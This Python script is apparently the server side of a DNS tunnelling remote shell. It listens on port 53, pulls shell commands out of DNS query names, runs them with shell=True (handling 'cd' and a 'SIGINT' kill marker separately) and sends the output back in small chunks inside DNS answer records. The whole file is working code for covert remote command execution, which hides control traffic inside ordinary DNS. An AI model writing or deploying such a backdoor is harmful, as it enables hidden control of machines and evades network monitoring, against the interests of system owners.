#!/usr/bin/python3

import sys
import os
import socket
import subprocess
from message import *

"""
splitRR split a string into an array of RR with the type t and a size of size bytes
and the ending sequence of our protocol (0000)
"""

def splitRR(string,t,size):
    a = [RR("",string[j:j+size], t, 1, 1) for j in range(0,len(string),size)] # Create subpart of the answer
    req = len(a) # Number of answer to send
    l = len(a[req - 1].rdata)
    
    if(l != size): # If the last answer is less than 4 bytes
        a[req - 1].rdata += b'\x00' * (size - l)
        
    #a.append(RR("",b'\x00' * size, t, 1, 1)) # Ending sequence

    return a


serversocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

if(len(sys.argv) == 2):
    serversocket.bind((sys.argv[1], 53))
else:
    print("No ip adress found, socket bind on 127.0.0.1")
    serversocket.bind(("127.0.0.1",53))

last = ""
p = None
type_RR = 1
nb_bytes = 4
answer_array = []
ending = b'\x00'*nb_bytes

while True:
    data, ad = serversocket.recvfrom(4096)
    #print(data)
    q = bytesToMessage(data)

    cmd = q.qList[0].qname.split(".")
    
    if(cmd[0] != "devtoplay"):
        if(last != cmd[0] and p is None and len(answer_array) == 0):
            cmd[0] = cmd[0].replace("\x07",".")
            i = 0
            while(cmd[0][i] >= "0" and cmd[0][i] <= "9"): # split salt and command
                i += 1
            
            if("cd" in cmd[0][i:]): # cd is a built-in command so we can't use subprocess
                os.chdir(cmd[0][i+3:])
                answer_array = [RR("",b'\x00' * nb_bytes, type_RR, 1, 1)]
            else:
                p = subprocess.Popen(cmd[0][i:],
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT,
                                     shell=True) # Run command in a subprocess
                
    if(p is not None): # If there is still something to read
        out = p.stdout.readline() # Read the output of the process
        
        if(p.poll() or out != b''): # b'' means the end of the file
            answer_array += splitRR(out,type_RR,nb_bytes) # Convert it into an array of RR
        else:
            p = None
            answer_array.append(RR("",b'\x00' * nb_bytes, type_RR, 1, 1))
        
    if(len(answer_array) > 0):
        
        if(cmd[0] != last):
            if "SIGINT" in cmd[0]:
                answer_array = [answer_array[-1]]
                
                if(p is not None and p.poll() is None): # If the process is still running, kill it
                    p.kill()
                    p = None
            
            answer = answer_array.pop(0)
            
            if(answer == ending):
                p = None
    else:
        answer = RR("",b'\x00' * nb_bytes, type_RR, 1, 1)

    print(answer)
    answer.name = q.qList[0].qname
    message = Message(
        Header(q.header.id, 1, 0, False, False, True, True, 0, 0, 1, 1, 0, 0),
        q.qList,
        [answer])
    last = cmd[0]


    # print(message)
    # print(message.getBytes())
    serversocket.sendto(message.getBytes(), ad)
    print("end")
        
        
